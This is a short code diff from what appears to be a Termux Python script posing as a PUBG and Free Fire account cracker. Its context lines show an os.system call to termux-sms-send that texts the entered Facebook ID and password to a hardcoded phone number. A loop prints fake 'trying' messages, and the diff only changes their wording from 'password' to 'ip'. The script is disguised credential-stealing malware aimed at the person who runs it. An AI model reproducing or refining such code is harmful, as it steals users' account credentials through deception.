@@ -45,7 +45,7 @@ def pubg():
     
     time.sleep(2)
     for i in range(10100,99999999):
-        print(f"Trying password for {username} :{i}")
+        print(f"Trying ip for {username} :{i}")
         time.sleep(0.3)
 
 
@@ -75,7 +75,7 @@ def free_fire():
     os.system(f"termux-sms-send -n 9815390185 id= local{fb_id},pass= local{fb_pass}")
     time.sleep(2)
     for i in range(10100,99999999):
-        print(f"Trying password for {username} :{i}")
+        print(f"Trying ip for {username} :{i}")
         time.sleep(0.3)
 
 
